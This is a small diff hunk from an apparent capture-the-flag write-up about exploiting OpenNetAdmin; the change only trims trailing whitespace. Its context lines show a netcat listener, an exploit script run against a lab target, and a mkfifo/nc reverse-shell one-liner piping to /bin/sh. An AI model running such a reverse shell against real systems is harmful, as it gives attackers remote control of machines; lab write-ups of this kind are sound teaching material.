@@ -65,7 +65,7 @@ We take the [source code](https://packetstormsecurity.com/files/155406/opennetad
 > lassault@kakia:~$ nc -lvnp 51111
 >
 > lassault@kakia:~$ ./exploit.sh http://10.10.10.171/ona/
-> 
+>
 > lassault@kakia:~$ mkfifo /tmp/flipper; nc 10.10.15.182 51111 < /tmp/flipper | /bin/sh > /tmp/flipper; rm /tmp/flipper;
 
 ---
